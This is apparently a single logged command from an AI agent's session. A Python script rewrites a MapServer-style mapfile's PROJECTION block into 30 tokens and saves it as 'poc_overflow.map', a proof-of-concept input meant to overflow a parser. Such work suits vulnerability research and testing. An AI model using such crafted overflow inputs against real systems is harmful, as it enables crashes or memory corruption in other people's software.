Running command: cd /workspace && python - <<'PY'
from pathlib import Path
s=Path('poc.map').read_text()
# replace projection block with many tokens
old='''  PROJECTION\n    "init=epsg:4326"\n    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"\n  END\n'''
new='''  PROJECTION\n'''+''.join(f'    "tok{i}"\n' for i in range(1,31))+'''  END\n'''
if old in s:
    s=s.replace(old,new,1)
else:
    # fallback replace first projection block in file
    import re
    s=re.sub(r'  PROJECTION\n(?:.*\n)*?  END\n', new, s, count=1)
Path('poc_overflow.map').write_text(s)
print('wrote', len(s))
